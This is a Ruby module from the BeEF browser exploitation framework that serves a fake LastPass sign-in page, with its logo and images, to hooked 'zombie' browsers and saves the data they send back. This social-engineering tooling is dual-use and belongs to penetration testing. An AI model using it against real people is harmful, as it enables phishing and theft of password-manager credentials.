#
# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Fake_lastpass < BeEF::Core::Command
  
  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/jquery-1.5.2.min.js','/lp/jquery','js')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/index-new.html','/lp/index','html')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/lp_signin_logo.png','/lp/lp_signin_logo','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/cancel.png','/lp/cancel','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/keyboard.png','/lp/keyboard','png')

  end
  
  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    if (@datastore['meta'] == "KILLFRAME") 
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/index.html')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/jquery.js') 
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/lp_signin_logo.png') 
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/cancel.png') 
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/keyboard.png') 
    end
    content = {}
    content['result'] = @datastore['result']
    save content
  end
  
end
